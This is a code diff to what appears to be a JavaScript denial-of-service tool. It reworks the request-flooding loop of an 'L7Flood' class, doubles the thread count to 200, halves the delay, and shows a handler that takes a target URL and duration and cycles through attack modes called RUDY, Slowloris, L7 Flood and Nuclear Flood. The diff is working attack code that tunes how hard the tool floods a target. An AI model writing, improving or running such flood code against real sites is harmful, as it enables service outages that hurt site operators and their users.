@@ -318,21 +318,17 @@ class L7Flood {
     }
 
     start() {
-        this._running = true;
-        const flood = () => {
-            if (!this._running) return;
+        this.floodInterval = setInterval(() => {
             for (let i = 0; i < this.threadCount; i++) {
                 this.sendRequest();
             }
-            // Use setImmediate to run the next batch of requests as soon as possible
-            // without blocking the event loop completely.
-            setImmediate(flood);
-        };
-        flood();
+        }, this.delay);
     }
 
     stop() {
-        this._running = false;
+        if (this.floodInterval) {
+            clearInterval(this.floodInterval);
+        }
     }
 }
 
@@ -372,8 +368,8 @@ class NuclearFlood extends L7Flood {
 }
 
 process.on('message', ({ targetUrl, duration }) => {
-    const threads = 100;
-    const l7Delay = 200; // Not used for timing, but for constructor compatibility
+    const threads = 200;
+    const l7Delay = 100;
     const allAttackModes = ['RUDY', 'L7 Flood', 'Slowloris', 'Nuclear Flood'];
 
     // Shuffle attack order
